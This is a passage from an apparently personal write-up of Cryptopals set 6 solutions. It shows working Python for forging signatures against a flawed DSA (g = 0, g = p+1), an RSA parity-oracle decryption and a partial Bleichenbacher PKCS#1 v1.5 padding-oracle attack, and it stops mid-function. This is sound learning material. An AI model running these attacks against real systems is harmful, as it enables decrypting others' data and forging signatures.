check <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>verify_signature(signature[<span style="color:#ae81ff">0</span>], signature[<span style="color:#ae81ff">1</span>], message<span style="color:#f92672">.</span>encode())
<span style="color:#66d9ef">if</span> check:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature successfully verified.&#34;</span>)
    
tampered_message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Tampered message!&#34;</span>
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Trying to verify signature of initial message for message:&#34;</span>, tampered_message)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Values from previous signature:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">r:&#34;</span>, signature[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">s:&#34;</span>, signature[<span style="color:#ae81ff">1</span>])
check <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>verify_signature(signature[<span style="color:#ae81ff">0</span>], signature[<span style="color:#ae81ff">1</span>], tampered_message<span style="color:#f92672">.</span>encode())
<span style="color:#66d9ef">if</span> check:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature successfully verified.&#34;</span>)
</code></pre></div><p><code>&gt; Message: Original message</code>
<code>&gt; Signature generated for g = 0.</code></p>
<p><code>r: 0 </code>
<code>s: 1319384916910796403481505255729961366741861352600</code>
<code>&gt; Signature successfully verified.</code></p>
<p><code>&gt; Trying to verify signature of initial message for message: Tampered message!</code>
<code>&gt; Values from previous signature:</code>
<code>r: 0 </code>
<code>s: 1319384916910796403481505255729961366741861352600</code>
<code>&gt; Signature successfully verified.</code></p>
<p>Now, for <em>g = (p + 1)</em>, applying modulus with <em>p</em> to it will give <em>1</em>, which raised to any power will always return <em>1</em>.</p>
<p>Thus we can yet again forge signature for any string. </p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DSA_parameter_tampering</span>() <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Parameter tampering for a flawed DSA.
</span><span style="color:#e6db74">    Exploits the vulnerability where value of r is not checked for zero.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    dsa <span style="color:#f92672">=</span> DSA_flawed(g <span style="color:#f92672">=</span> DSA<span style="color:#f92672">.</span>DEFAULT_P <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
    message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;g = (p + 1) DSA&#34;</span>
    signature <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>generate_signature(message<span style="color:#f92672">.</span>encode())
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Message:&#34;</span>, message)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature generated for g = (p + 1).</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">r:&#34;</span>, signature[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">s:&#34;</span>, signature[<span style="color:#ae81ff">1</span>])
    check <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>verify_signature(signature[<span style="color:#ae81ff">0</span>], signature[<span style="color:#ae81ff">1</span>], message<span style="color:#f92672">.</span>encode())
    <span style="color:#66d9ef">if</span> check:
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature successfully verified for original message.&#34;</span>)
    
    z <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">100</span>)
    y <span style="color:#f92672">=</span> dsa<span style="color:#f92672">.</span>key_distribution()
    forged_r <span style="color:#f92672">=</span> pow(y, z, DSA_flawed<span style="color:#f92672">.</span>DEFAULT_P) <span style="color:#f92672">%</span> DSA_flawed<span style="color:#f92672">.</span>DEFAULT_Q
    forged_s <span style="color:#f92672">=</span> (forged_r <span style="color:#f92672">*</span> mod_inverse(z, dsa<span style="color:#f92672">.</span>DEFAULT_Q)) <span style="color:#f92672">%</span> dsa<span style="color:#f92672">.</span>DEFAULT_Q
    
    message1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello, world&#34;</span>
    message2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Goodbye, world&#34;</span>
    
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Values from forged signature:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">r:&#34;</span>, forged_r, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">s:&#34;</span>, forged_s)
    
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Message 1:&#34;</span>, message1)
    <span style="color:#66d9ef">if</span> dsa<span style="color:#f92672">.</span>verify_signature(forged_r, forged_s, message1<span style="color:#f92672">.</span>encode()):
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature successfully verified for message 1.&#34;</span>)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Message 2:&#34;</span>, message2)
    <span style="color:#66d9ef">if</span> dsa<span style="color:#f92672">.</span>verify_signature(forged_r, forged_s, message2<span style="color:#f92672">.</span>encode()):
        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Signature successfully verified for message 2.&#34;</span>)
        <span style="color:#66d9ef">return</span> True
</code></pre></div><p><code>&gt; Message: g = (p + 1) DSA</code></p>
<p><code>&gt; Signature generated for g = (p + 1).</code></p>
<p><code>r: 1 </code></p>
<p><code>s: 703825769835692073972406982417451225320756768361</code></p>
<p><code>&gt; Signature successfully verified for original message.</code></p>
<p><code>&gt; Values from forged signature:</code></p>
<p><code>r: 1 </code></p>
<p><code>s: 719200900302382415334968953803618372055900244717</code></p>
<p><code>&gt; Message 1: Hello, world</code></p>
<p><code>&gt; Signature successfully verified for message 1.</code></p>
<p><code>&gt; Message 2: Goodbye, world</code></p>
<p><code>&gt; Signature successfully verified for message 2.</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-46-rsa-parity-oracle">Challenge 46: RSA parity oracle</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/46">Link</a></p>
<blockquote>
<p>Generate a 1024 bit RSA key pair.<br>
Write an oracle function that uses the private key to answer the question &ldquo;is the plaintext of this message even or odd&rdquo; (is the last bit of the message 0 or 1). Imagine for instance a server that accepted RSA-encrypted messages and checked the parity of their decryption to validate them, and spat out an error if they were of the wrong parity.<br>
Anyways: function returning true or false based on whether the decrypted plaintext was even or odd, and nothing else.<br>
Take the following string and un-Base64 it in your code (without looking at it!) and encrypt it to the public key, creating a ciphertext: <strong>VGhhdCdzIHdoeSBJIGZvdW5kIHlvdSBkb24ndCBwbGF5IGFyb3VuZCB3aXRoIHRoZSBGdW5reSBDb</strong><br>
<strong>2xkIE1lZGluYQ==</strong><br>
With your oracle function, you can trivially decrypt the message. Here&rsquo;s why:</p>
<ul>
<li>RSA ciphertexts are just numbers. You can do trivial math on them. You can for instance multiply a ciphertext by the RSA-encryption of another number; the corresponding plaintext will be the product of those two numbers.</li>
<li>If you double a ciphertext (multiply it by (2**e)%n), the resulting plaintext will (obviously) be either even or odd.</li>
<li>If the plaintext after doubling is even, doubling the plaintext didn&rsquo;t wrap the modulus &mdash; the modulus is a prime number. That means the plaintext is less than half the modulus.</li>
</ul>
<p>You can repeatedly apply this heuristic, once per bit of the message, checking your oracle function each time.<br>
Your decryption function starts with bounds for the plaintext of [0,n].<br>
Each iteration of the decryption cuts the bounds in half; either the upper bound is reduced by half, or the lower bound is.<br>
After log2(n) iterations, you have the decryption of the message.<br>
Print the upper bound of the message as a string at each iteration; you&rsquo;ll see the message decrypt &ldquo;hollywood style&rdquo;.<br>
Decrypt the string (after encrypting it to a hidden private key) above.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> math
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">import</span> decimal
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
given_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;VGhhdCdzIHdoeSBJIGZvdW5kIHlvdSBkb24ndCBwbGF5IGFyb3VuZCB3aXRoIHRoZSBGdW5reSBDb2xkIE1lZGluYQ==&#34;</span>
</code></pre></div><p>Answers the question mentioned in the challenge:<br>
&ldquo;is the plaintext of this message even or odd&rdquo; (is the last bit of the message 0 or 1)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_parity</span>(ciphertext: int, rsa: object) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns the last bit of the number.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> rsa<span style="color:#f92672">.</span>decryptnum(ciphertext) <span style="color:#f92672">&amp;</span>amp; <span style="color:#ae81ff">1</span>
</code></pre></div><p>Test the parity check function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rsa <span style="color:#f92672">=</span> RSA(<span style="color:#ae81ff">1024</span>)
ciphertext <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>encrypt(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello&#34;</span>)
<span style="color:#66d9ef">print</span>(check_parity(ciphertext, rsa))
</code></pre></div><p><code>1</code></p>
<p>The idea is to multiply the number by factors of 2 to check if the number wrapped around the modulus.</p>
<p>Refer to this post on <a href="https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack">crypto.stackexchange</a> for an explanation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parity_attack</span>(message: bytes, rsa: object) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Parity attack on RSA
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    (_, n) <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>pub
    ciphertext <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>encryptnum(int<span style="color:#f92672">.</span>from_bytes(message, <span style="color:#e6db74">&#34;big&#34;</span>))
    
    <span style="color:#75715e"># encrypt multiplier</span>
    multiplier <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>encryptnum(<span style="color:#ae81ff">2</span>)
    
    <span style="color:#75715e"># Initialize lower and upper bound.</span>
    <span style="color:#75715e"># I need to use Decimal because it allows me to set the precision for the floating point</span>
    <span style="color:#75715e"># numbers, which we will need when doing the binary search divisions.</span>
    lower_bound <span style="color:#f92672">=</span> decimal<span style="color:#f92672">.</span>Decimal(<span style="color:#ae81ff">0</span>)
    upper_bound <span style="color:#f92672">=</span> decimal<span style="color:#f92672">.</span>Decimal(n)
    
    <span style="color:#75715e"># Compute the number of iterations that we have to do</span>
    num_iter <span style="color:#f92672">=</span> int(math<span style="color:#f92672">.</span>ceil(math<span style="color:#f92672">.</span>log(n, <span style="color:#ae81ff">2</span>)))
    <span style="color:#75715e"># Set the precision of the floating point number to be enough</span>
    decimal<span style="color:#f92672">.</span>getcontext()<span style="color:#f92672">.</span>prec <span style="color:#f92672">=</span> num_iter

    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(num_iter):
        ciphertext <span style="color:#f92672">=</span> (ciphertext <span style="color:#f92672">*</span> multiplier) <span style="color:#f92672">%</span> n
        
        <span style="color:#75715e"># checking parity</span>
        <span style="color:#66d9ef">if</span> check_parity(ciphertext, rsa) <span style="color:#f92672">&amp;</span>amp; <span style="color:#ae81ff">1</span>:
            lower_bound <span style="color:#f92672">=</span> (lower_bound <span style="color:#f92672">+</span> upper_bound) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>
        <span style="color:#66d9ef">else</span>:
            upper_bound <span style="color:#f92672">=</span> (lower_bound <span style="color:#f92672">+</span> upper_bound) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>

    <span style="color:#75715e"># Return the binary version of the upper_bound (converted from Decimal to int)</span>
    <span style="color:#66d9ef">return</span> int(upper_bound)<span style="color:#f92672">.</span>to_bytes((int(upper_bound)<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_string <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(given_string)
plaintext <span style="color:#f92672">=</span> parity_attack(byte_string, RSA(<span style="color:#ae81ff">1024</span>))
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-47-bleichenbachers-pkcs-15-padding-oracle-simple-case">Challenge 47: Bleichenbacher&rsquo;s PKCS 1.5 Padding Oracle (Simple Case)</h3>
<p><a href="https://cryptopals.com/sets/6/challenges/47">Link</a></p>
<blockquote>
<p>Let us Google this for you: <a href="https://lmgtfy.com/?q=%22Chosen+ciphertext+attacks+against+protocols+based+on+the+RSA+encryption+standard%22">&ldquo;Chosen ciphertext attacks against protocols based on the RSA encryption standard&rdquo;</a><br>
This is Bleichenbacher from CRYPTO &lsquo;98; I get a bunch of .ps versions on the first search page.<br>
Read the paper. It describes a padding oracle attack on PKCS#1v1.5. The attack is similar in spirit to the CBC padding oracle you built earlier; it&rsquo;s an &ldquo;adaptive chosen ciphertext attack&rdquo;, which means you start with a valid ciphertext and repeatedly corrupt it, bouncing the adulterated ciphertexts off the target to learn things about the original.<br>
This is a common flaw even in modern cryptosystems that use RSA.<br>
It&rsquo;s also the most fun you can have building a crypto attack. It involves 9th grade math, but also has you implementing an algorithm that is complex on par with finding a minimum cost spanning tree.<br>
The setup:</p>
<ul>
<li>Build an oracle function, just like you did in the last exercise, but have it check for plaintext[0] == 0 and plaintext[1] == 2.</li>
<li>Generate a 256 bit keypair (that is, p and q will each be 128 bit primes), [n, e, d].</li>
<li>Plug d and n into your oracle function.</li>
<li>PKCS1.5-pad a short message, like &ldquo;kick it, CC&rdquo;, and call it &ldquo;m&rdquo;. Encrypt to to get &ldquo;c&rdquo;.</li>
<li>Decrypt &ldquo;c&rdquo; using your padding oracle.</li>
</ul>
<p>For this challenge, we&rsquo;ve used an untenably small RSA modulus (you could factor this keypair instantly). That&rsquo;s because this exercise targets a specific step in the Bleichenbacher paper &mdash; Step 2c, which implements a fast, nearly O(log n) search for the plaintext.<br>
Things you want to keep in mind as you read the paper:</p>
<ul>
<li>RSA ciphertexts are just numbers.</li>
<li>RSA is &ldquo;homomorphic&rdquo; with respect to multiplication, which means you can multiply c * RSA(2) to get a c&rsquo; that will decrypt to plaintext * 2. This is mindbending but easy to see if you play with it in code &mdash; try multiplying ciphertexts with the RSA encryptions of numbers so you know you grok it.</li>
<li>What you need to grok for this challenge is that Bleichenbacher uses multiplication on ciphertexts the way the CBC oracle uses XORs of random blocks.</li>
<li>A PKCS#1v1.5 conformant plaintext, one that starts with 00:02, must be a number between 02:00:00&hellip;00 and 02:FF:FF..FF &mdash; in other words, 2B and 3B-1, where B is the bit size of the modulus minus the first 16 bits. When you see 2B and 3B, that&rsquo;s the idea the paper is playing with.</li>
</ul>
<p>To decrypt &ldquo;c&rdquo;, you&rsquo;ll need Step 2a from the paper (the search for the first &ldquo;s&rdquo; that, when encrypted and multiplied with the ciphertext, produces a conformant plaintext), Step 2c, the fast O(log n) search, and Step 3.<br>
Your Step 3 code is probably not going to need to handle multiple ranges.<br>
We recommend you just use the raw math from paper (check, check, double check your translation to code) and not spend too much time trying to grok how the math works.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> random
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;kick it, CC&#34;</span>
</code></pre></div><p>RSA Oracle extended to check for PKCS1 padding.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RSA_PKCS1_Oracle</span>(RSA):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Extends the RSA class by making the decryption PKCS 1.5 compliant and by adding a method
</span><span style="color:#e6db74">    to verify the padding of data.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PKCS1_Pad</span>(self: object, message: bytes) <span style="color:#f92672">-&gt;</span> bytes:
        <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">        Pads the given binary data conforming to the PKCS 1.5 format.
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        
        (e, n) <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pub
        byte_length <span style="color:#f92672">=</span> (n<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>
        padding_string <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getrandom(byte_length <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">-</span> len(message))
        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x02</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> padding_string <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> message
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PKCS1_check_padding</span>(self: object, ciphertext: int) <span style="color:#f92672">-&gt;</span> bool:
        <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">        Decrypts the input data and returns whether its padding is correct according to PKCS 1.5.
</span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
        
        _, n <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pub
        k <span style="color:#f92672">=</span> (n<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>
        pbytes <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>decrypt(ciphertext)
        pbytes <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (k <span style="color:#f92672">-</span> len(pbytes))) <span style="color:#f92672">+</span> pbytes
        <span style="color:#66d9ef">return</span> pbytes[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x02</span><span style="color:#e6db74">&#39;</span>
</code></pre></div><p>Function to aid in calculation.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ceil</span>(a: int, b: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns the ceil of division between two numbers.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> (a <span style="color:#f92672">+</span> b <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> b
</code></pre></div><p>Function aid in Padding Oracle Attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">append_interval</span>(M_narrow: list, lower_bound: int, upper_bound: int):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Append the passed bounds as an interval to the list.
</span><span style="color:#e6db74">    Write over the interval if tighter constraints are passed.
</span><span style="color:#e6db74">    Skip if it already exists.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    <span style="color:#75715e"># Check if there exist an interval which is overlapping with the lower_bound and</span>
    <span style="color:#75715e"># upper_bound of the new interval we want to append</span>
    <span style="color:#66d9ef">for</span> i, (a, b) <span style="color:#f92672">in</span> enumerate(M_narrow):

        <span style="color:#75715e"># If there is an overlap, then replace the boundaries of the overlapping</span>
        <span style="color:#75715e"># interval with the wider (or equal) boundaries of the new merged interval</span>
        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (b <span style="color:#f92672">&lt;</span> lower_bound <span style="color:#f92672">or</span> a <span style="color:#f92672">&gt;</span> upper_bound):
            new_a <span style="color:#f92672">=</span> min(lower_bound, a)
            new_b <span style="color:#f92672">=</span> max(upper_bound, b)
            M_narrow[i] <span style="color:#f92672">=</span> new_a, new_b
            <span style="color:#66d9ef">return</span>

    <span style="color:#75715e"># If there was no interval overlapping with the one we want to add, add</span>
    <span style="color:#75715e"># the new interval as a standalone interval to the list</span>
    M_narrow<span style="color:#f92672">.</span>append((lower_bound, upper_bound))
    <span style="color:#66d9ef">return</span>
</code></pre></div><p>Quoting the <a href="http://archiv.infsec.ethz.ch/education/fs08/secsem/Bleichenbacher98.pdf">original paper</a>,</p>
<blockquote>
<p>The attacker tries to find small values s_is i ​ for which the ciphertext c⁰(sᶦ)ᵉ mod n is PKCS conforming. For each successful value for sᶦ , the attacker computes, using previous knowledge about m⁰​, a set of intervals that must contain m⁰… The third phase starts when only one interval remains. Then, the attacker has sufficient information about m⁰​ to choose sᶦ ​such that c⁰(sᶦ)ᵉ mod n is much more likely to be PKCS conforming than is a randomly chosen message. The size of sᶦ is increased gradually, narrowing the possible range of m⁰​ until only one possible value remains.</p>
</blockquote>
<p>The implementation is from the steps defined in the paper.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">padding_oracle_attack</span>(ciphertext: bytes, rsa: object):
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Performs the padding oracle attack on RSA ciphertext.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    
    
    <span style="color:#75715e"># Setting initial values</span>
    
    (e, n) <span style="color:#f92672">=</span> rsa<span style="color:#f92672">.</span>pub
    k <span style="color:#f92672">=</span> (n<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># byte length</span>
    B <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**</span>(<span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> (k <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>))
    M <span style="color:#f92672">=</span> [(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B, <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)]
    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
    
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(ciphertext):
        <span style="color:#75715e">#Step 1 Blinding</span>
        <span style="color:#66d9ef">while</span> True:
            s <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
            c0 <span style="color:#f92672">=</span> (ciphertext <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
            <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c0):
                <span style="color:#66d9ef">break</span>

    <span style="color:#66d9ef">else</span>:
        c0 <span style="color:#f92672">=</span> ciphertext
        
    <span style="color:#75715e"># Step 2 Searching for PKCS conforming messages</span>
    <span style="color:#66d9ef">while</span> True:
        <span style="color:#75715e"># 2a</span>
        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            s <span style="color:#f92672">=</span> (n <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B)
            <span style="color:#66d9ef">while</span> True:
                c <span style="color:#f92672">=</span> (c0 <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
                <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c):
                    <span style="color:#66d9ef">break</span>
                s <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        
        <span style="color:#75715e">#2c</span>
        <span style="color:#75715e"># Step 2.c: Searching with one interval left</span>
        <span style="color:#66d9ef">elif</span> len(M) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
            a, b <span style="color:#f92672">=</span> M[<span style="color:#ae81ff">0</span>]

            <span style="color:#75715e"># Check if the interval contains the solution</span>
            <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> b:

                <span style="color:#75715e"># And if it does, return it as bytes</span>
                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> (a)<span style="color:#f92672">.</span>to_bytes((a<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)

            r <span style="color:#f92672">=</span> ceil(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (b <span style="color:#f92672">*</span> s <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B), n)
            s <span style="color:#f92672">=</span> ceil(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n, b)

            <span style="color:#66d9ef">while</span> True:
                c <span style="color:#f92672">=</span> (c0 <span style="color:#f92672">*</span> pow(s, e, n)) <span style="color:#f92672">%</span> n
                <span style="color:#66d9ef">if</span> rsa<span style="color:#f92672">.</span>PKCS1_check_padding(c):
                    <span style="color:#66d9ef">break</span>

                s <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
                <span style="color:#66d9ef">if</span> s <span style="color:#f92672">&gt;</span> (<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n) <span style="color:#f92672">//</span> a:
                    r <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
                    s <span style="color:#f92672">=</span> ceil((<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> r <span style="color:#f92672">*</span> n), b)

        <span style="color:#75715e"># Step 3: Narrowing the set of solutions</span>
        M_new <span style="color:#f92672">=</span> []

        <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> M:
            min_r <span style="color:#f92672">=</span> ceil(a <span style="color:#f92672">*</span> s <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> B <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, n)
